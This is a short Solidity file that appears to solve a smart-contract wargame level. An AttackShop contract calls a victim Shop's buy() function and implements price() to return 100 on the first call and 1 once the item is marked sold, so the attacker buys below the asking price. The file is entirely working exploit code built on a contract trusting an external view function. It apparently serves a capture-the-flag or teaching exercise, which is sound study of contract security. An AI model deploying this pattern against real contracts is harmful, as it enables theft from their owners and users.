// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract AttackShop {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    // start the attack
    function attack() public {
        Shop(victim).buy();
    }

    // called by the Shop contract
    function price() external view returns (uint256) {
        uint256 price = Shop(victim).isSold() ? 1 : 100; //the second call will now have a different price
        return price;
    }
}
